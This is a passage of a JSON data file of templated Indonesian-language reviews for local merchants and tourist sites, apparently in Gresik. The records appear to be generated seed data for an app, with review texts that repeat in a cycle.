                "merchantId": "m183",
                "userName": "Warkop_Lover_30",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-17T14:36:35.405Z"
            },
            {
                "id": "r548",
                "merchantId": "m183",
                "userName": "Sejarah_RI_78",
                "rating": 4,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-16T14:36:35.405Z"
            },
            {
                "id": "r549",
                "merchantId": "m183",
                "userName": "Keluarga_Ceria_25",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-23T14:36:35.405Z"
            },
            {
                "id": "r550",
                "merchantId": "m184",
                "userName": "Warkop_Lover_27",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-27T14:36:35.405Z"
            },
            {
                "id": "r551",
                "merchantId": "m184",
                "userName": "Sejarah_RI_73",
                "rating": 5,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-16T14:36:35.405Z"
            },
            {
                "id": "r552",
                "merchantId": "m184",
                "userName": "Keluarga_Ceria_48",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-15T14:36:35.405Z"
            },
            {
                "id": "r553",
                "merchantId": "m185",
                "userName": "Warkop_Lover_72",
                "rating": 5,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-15T14:36:35.405Z"
            },
            {
                "id": "r554",
                "merchantId": "m185",
                "userName": "Sejarah_RI_80",
                "rating": 5,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-20T14:36:35.405Z"
            },
            {
                "id": "r555",
                "merchantId": "m185",
                "userName": "Keluarga_Ceria_13",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-20T14:36:35.405Z"
            },
            {
                "id": "r556",
                "merchantId": "m186",
                "userName": "Warkop_Lover_55",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-17T14:36:35.405Z"
            },
            {
                "id": "r557",
                "merchantId": "m186",
                "userName": "Sejarah_RI_76",
                "rating": 4,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-27T14:36:35.405Z"
            },
            {
                "id": "r558",
                "merchantId": "m186",
                "userName": "Keluarga_Ceria_94",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-18T14:36:35.405Z"
            },
            {
                "id": "r559",
                "merchantId": "m187",
                "userName": "Warkop_Lover_83",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-19T14:36:35.405Z"
            },
            {
                "id": "r560",
                "merchantId": "m187",
                "userName": "Sejarah_RI_48",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-23T14:36:35.405Z"
            },
            {
                "id": "r561",
                "merchantId": "m187",
                "userName": "Keluarga_Ceria_72",
                "rating": 5,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-27T14:36:35.405Z"
            },
            {
                "id": "r562",
                "merchantId": "m188",
                "userName": "Warkop_Lover_97",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-26T14:36:35.405Z"
            },
            {
                "id": "r563",
                "merchantId": "m188",
                "userName": "Sejarah_RI_26",
                "rating": 4,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-19T14:36:35.405Z"
            },
            {
                "id": "r564",
                "merchantId": "m188",
                "userName": "Keluarga_Ceria_25",
                "rating": 5,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-15T14:36:35.405Z"
            },
            {
                "id": "r565",
                "merchantId": "m189",
                "userName": "Warkop_Lover_15",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r566",
                "merchantId": "m189",
                "userName": "Sejarah_RI_73",
                "rating": 4,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-27T14:36:35.405Z"
            },
            {
                "id": "r567",
                "merchantId": "m189",
                "userName": "Keluarga_Ceria_70",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r568",
                "merchantId": "m190",
                "userName": "Warkop_Lover_17",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r569",
                "merchantId": "m190",
                "userName": "Sejarah_RI_64",
                "rating": 4,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-20T14:36:35.405Z"
            },
            {
                "id": "r570",
                "merchantId": "m190",
                "userName": "Keluarga_Ceria_70",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-19T14:36:35.405Z"
            },
            {
                "id": "r571",
                "merchantId": "m191",
                "userName": "Neng_Siti_77",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-16T14:36:35.405Z"
            },
            {
                "id": "r572",
                "merchantId": "m191",
                "userName": "Warkop_Lover_49",
                "rating": 4,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-15T14:36:35.405Z"
            },
            {
                "id": "r573",
                "merchantId": "m191",
                "userName": "Sejarah_RI_10",
                "rating": 5,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-16T14:36:35.405Z"
            },
            {
                "id": "r574",
                "merchantId": "m192",
                "userName": "Warkop_Lover_86",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-16T14:36:35.405Z"
            },
            {
                "id": "r575",
                "merchantId": "m192",
                "userName": "Sejarah_RI_97",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-15T14:36:35.405Z"
            },
            {
                "id": "r576",
                "merchantId": "m192",
                "userName": "Keluarga_Ceria_46",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-23T14:36:35.405Z"
            },
            {
                "id": "r577",
                "merchantId": "m193",
                "userName": "Warkop_Lover_76",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r578",
                "merchantId": "m193",
                "userName": "Sejarah_RI_33",
                "rating": 4,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-26T14:36:35.405Z"
            },
            {
                "id": "r579",
                "merchantId": "m193",
                "userName": "Keluarga_Ceria_50",
                "rating": 5,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-17T14:36:35.405Z"
            },
            {
                "id": "r580",
                "merchantId": "m194",
                "userName": "Warkop_Lover_41",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-21T14:36:35.405Z"
            },
            {
                "id": "r581",
                "merchantId": "m194",
                "userName": "Sejarah_RI_19",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-24T14:36:35.405Z"
            },
            {
                "id": "r582",
                "merchantId": "m194",
                "userName": "Keluarga_Ceria_22",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-24T14:36:35.405Z"
            },
            {
                "id": "r583",
                "merchantId": "m195",
                "userName": "Warkop_Lover_28",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r584",
                "merchantId": "m195",
                "userName": "Sejarah_RI_79",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r585",
                "merchantId": "m195",
                "userName": "Keluarga_Ceria_92",
                "rating": 5,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-25T14:36:35.405Z"
            },
            {
                "id": "r586",
                "merchantId": "m196",
                "userName": "Warkop_Lover_77",
                "rating": 4,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r587",
                "merchantId": "m196",
                "userName": "Sejarah_RI_61",
                "rating": 5,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-17T14:36:35.405Z"
            },
            {
                "id": "r588",
                "merchantId": "m196",
                "userName": "Keluarga_Ceria_73",
                "rating": 5,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-15T14:36:35.405Z"
            },
            {
                "id": "r589",
                "merchantId": "m197",
                "userName": "Warkop_Lover_84",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-15T14:36:35.405Z"
            },
            {
                "id": "r590",
                "merchantId": "m197",
                "userName": "Sejarah_RI_19",
                "rating": 4,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r591",
                "merchantId": "m197",
                "userName": "Keluarga_Ceria_85",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-23T14:36:35.405Z"
            },
            {
                "id": "r592",
                "merchantId": "m198",
                "userName": "Warkop_Lover_81",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-16T14:36:35.405Z"
            },
            {
                "id": "r593",
                "merchantId": "m198",
                "userName": "Sejarah_RI_57",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-20T14:36:35.405Z"
            },
            {
                "id": "r594",
                "merchantId": "m198",
                "userName": "Keluarga_Ceria_69",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-25T14:36:35.405Z"
            },
            {
                "id": "r595",
                "merchantId": "m199",
                "userName": "Warkop_Lover_62",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r596",
                "merchantId": "m199",
                "userName": "Sejarah_RI_91",
                "rating": 4,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-15T14:36:35.405Z"
            },
            {
                "id": "r597",
                "merchantId": "m199",
                "userName": "Keluarga_Ceria_38",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-19T14:36:35.405Z"
            },
            {
                "id": "r598",
                "merchantId": "m200",
                "userName": "Warkop_Lover_37",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-20T14:36:35.405Z"
            },
            {
                "id": "r599",
                "merchantId": "m200",
                "userName": "Sejarah_RI_42",
                "rating": 5,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-17T14:36:35.405Z"
            },
            {
                "id": "r600",
                "merchantId": "m200",
                "userName": "Keluarga_Ceria_66",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-18T14:36:35.405Z"
            },
            {
                "id": "r601",
                "merchantId": "m201",
                "userName": "Warkop_Lover_22",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-21T14:36:35.405Z"
            },
            {
                "id": "r602",
                "merchantId": "m201",
                "userName": "Sejarah_RI_78",
                "rating": 4,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-16T14:36:35.405Z"
            },
            {
                "id": "r603",
                "merchantId": "m201",
                "userName": "Keluarga_Ceria_48",
                "rating": 5,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-23T14:36:35.405Z"
            },
            {
                "id": "r604",
                "merchantId": "m202",
                "userName": "Neng_Siti_36",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-19T14:36:35.405Z"
            },
            {
                "id": "r605",
                "merchantId": "m202",
                "userName": "Warkop_Lover_93",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-15T14:36:35.405Z"
            },
            {
                "id": "r606",
                "merchantId": "m202",
                "userName": "Sejarah_RI_63",
                "rating": 5,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-21T14:36:35.405Z"
            },
            {
                "id": "r607",
                "merchantId": "m203",
                "userName": "Warkop_Lover_80",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-28T14:36:35.405Z"
            },
            {
                "id": "r608",
                "merchantId": "m203",
                "userName": "Sejarah_RI_60",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-15T14:36:35.405Z"
            },
            {
                "id": "r609",
                "merchantId": "m203",
                "userName": "Keluarga_Ceria_74",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-26T14:36:35.405Z"
            },
            {
                "id": "r610",
                "merchantId": "m204",
                "userName": "Warkop_Lover_79",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-18T14:36:35.405Z"
            },
            {
                "id": "r611",
                "merchantId": "m204",
                "userName": "Sejarah_RI_82",
                "rating": 4,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-25T14:36:35.405Z"
            },
            {
                "id": "r612",
                "merchantId": "m204",
                "userName": "Keluarga_Ceria_23",
                "rating": 5,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-26T14:36:35.405Z"
            },
            {
                "id": "r613",
                "merchantId": "m205",
                "userName": "Warkop_Lover_95",
                "rating": 4,
                "text": "Toko oleh-oleh paling komplit dengan packing yang rapi. Pelayanannya ramah membantu membawakan ke mobil.",
                "timestamp": "2026-05-17T14:36:35.405Z"
            },
            {
                "id": "r614",
                "merchantId": "m205",
                "userName": "Sejarah_RI_14",
                "rating": 5,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r615",
                "merchantId": "m205",
                "userName": "Keluarga_Ceria_64",
                "rating": 4,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-24T14:36:35.405Z"
            },
            {
                "id": "r616",
                "merchantId": "m206",
                "userName": "Warkop_Lover_51",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-26T14:36:35.405Z"
            },
            {
                "id": "r617",
                "merchantId": "m206",
                "userName": "Sejarah_RI_80",
                "rating": 4,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-18T14:36:35.405Z"
            },
            {
                "id": "r618",
                "merchantId": "m206",
                "userName": "Keluarga_Ceria_21",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-20T14:36:35.405Z"
            },
            {
                "id": "r619",
                "merchantId": "m207",
                "userName": "Warkop_Lover_83",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-24T14:36:35.405Z"
            },
            {
                "id": "r620",
                "merchantId": "m207",
                "userName": "Sejarah_RI_26",
                "rating": 5,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-17T14:36:35.405Z"
            },
            {
                "id": "r621",
                "merchantId": "m207",
                "userName": "Keluarga_Ceria_33",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-22T14:36:35.405Z"
            },
            {
                "id": "r622",
                "merchantId": "m208",
                "userName": "Warkop_Lover_57",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-16T14:36:35.405Z"
            },
            {
                "id": "r623",
                "merchantId": "m208",
                "userName": "Sejarah_RI_49",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-21T14:36:35.405Z"
            },
            {
                "id": "r624",
                "merchantId": "m208",
                "userName": "Keluarga_Ceria_64",
                "rating": 5,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-18T14:36:35.405Z"
            },
            {
                "id": "r625",
                "merchantId": "m209",
                "userName": "Warkop_Lover_64",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-25T14:36:35.405Z"
            },
            {
                "id": "r626",
                "merchantId": "m209",
                "userName": "Sejarah_RI_74",
                "rating": 5,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-21T14:36:35.405Z"
            },
            {
                "id": "r627",
                "merchantId": "m209",
                "userName": "Keluarga_Ceria_40",
                "rating": 5,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-23T14:36:35.405Z"
            },
            {
                "id": "r628",
                "merchantId": "m210",
                "userName": "Warkop_Lover_99",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-27T14:36:35.405Z"
            },
            {
                "id": "r629",
                "merchantId": "m210",
                "userName": "Sejarah_RI_86",
                "rating": 4,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-24T14:36:35.405Z"
            },
            {
                "id": "r630",
                "merchantId": "m210",
                "userName": "Keluarga_Ceria_98",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r631",
                "merchantId": "m211",
                "userName": "Warkop_Lover_51",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-19T14:36:35.405Z"
            },
            {
                "id": "r632",
                "merchantId": "m211",
                "userName": "Sejarah_RI_63",
                "rating": 5,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-27T14:36:35.405Z"
            },
            {
                "id": "r633",
                "merchantId": "m211",
                "userName": "Keluarga_Ceria_54",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-22T14:36:35.405Z"
            },
            {
                "id": "r634",
                "merchantId": "m212",
                "userName": "Warkop_Lover_17",
                "rating": 4,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-27T14:36:35.405Z"
            },
            {
                "id": "r635",
                "merchantId": "m212",
                "userName": "Sejarah_RI_10",
                "rating": 5,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-27T14:36:35.405Z"
            },
            {
                "id": "r636",
                "merchantId": "m212",
                "userName": "Keluarga_Ceria_46",
                "rating": 5,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-17T14:36:35.405Z"
            },
            {
                "id": "r637",
                "merchantId": "m213",
                "userName": "Warkop_Lover_63",
                "rating": 4,
                "text": "Toko oleh-oleh paling komplit dengan packing yang rapi. Pelayanannya ramah membantu membawakan ke mobil.",
                "timestamp": "2026-05-16T14:36:35.405Z"
            },
            {
                "id": "r638",
                "merchantId": "m213",
                "userName": "Sejarah_RI_54",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-21T14:36:35.405Z"
            },
            {
                "id": "r639",
                "merchantId": "m213",
                "userName": "Keluarga_Ceria_98",
                "rating": 5,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-16T14:36:35.405Z"
            },
            {
                "id": "r640",
                "merchantId": "m214",
                "userName": "Warkop_Lover_99",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-22T14:36:35.405Z"
            },
            {
                "id": "r641",
                "merchantId": "m214",
                "userName": "Sejarah_RI_40",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-25T14:36:35.405Z"
            },
            {
                "id": "r642",
                "merchantId": "m214",
                "userName": "Keluarga_Ceria_69",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-20T14:36:35.405Z"
            },
            {
                "id": "r643",
                "merchantId": "m215",
                "userName": "Warkop_Lover_72",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-19T14:36:35.405Z"
            },
            {
                "id": "r644",
                "merchantId": "m215",
                "userName": "Sejarah_RI_63",
                "rating": 5,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-28T14:36:35.405Z"
            },
            {
                "id": "r645",
                "merchantId": "m215",
                "userName": "Keluarga_Ceria_74",
                "rating": 5,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-19T14:36:35.405Z"
            },
            {
                "id": "r646",
                "merchantId": "m216",
                "userName": "Warkop_Lover_16",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-23T14:36:35.405Z"
            },
            {
                "id": "r647",
                "merchantId": "m216",
                "userName": "Sejarah_RI_24",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-25T14:36:35.405Z"
            },
            {
                "id": "r648",
                "merchantId": "m216",
                "userName": "Keluarga_Ceria_51",
                "rating": 5,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-18T14:36:35.405Z"
            },
            {
                "id": "r649",
                "merchantId": "m217",
                "userName": "Warkop_Lover_81",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r650",
                "merchantId": "m217",
                "userName": "Sejarah_RI_96",
                "rating": 5,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-18T14:36:35.405Z"
            },
            {
                "id": "r651",
                "merchantId": "m217",
                "userName": "Keluarga_Ceria_74",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-24T14:36:35.406Z"
            },
            {
                "id": "r652",
                "merchantId": "m218",
                "userName": "Warkop_Lover_25",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-28T14:36:35.406Z"
            },
            {
                "id": "r653",
                "merchantId": "m218",
                "userName": "Sejarah_RI_67",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-18T14:36:35.406Z"
            },
            {
                "id": "r654",
                "merchantId": "m218",
                "userName": "Keluarga_Ceria_68",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r655",
                "merchantId": "m219",
                "userName": "Warkop_Lover_93",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-28T14:36:35.406Z"
            },
            {
                "id": "r656",
                "merchantId": "m219",
                "userName": "Sejarah_RI_38",
                "rating": 5,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r657",
                "merchantId": "m219",
                "userName": "Keluarga_Ceria_22",
                "rating": 5,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-16T14:36:35.406Z"
            },
            {
                "id": "r658",
                "merchantId": "m220",
                "userName": "Warkop_Lover_12",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-28T14:36:35.406Z"
            },
            {
                "id": "r659",
                "merchantId": "m220",
                "userName": "Sejarah_RI_48",
                "rating": 5,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r660",
                "merchantId": "m220",
                "userName": "Keluarga_Ceria_29",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-19T14:36:35.406Z"
            },
            {
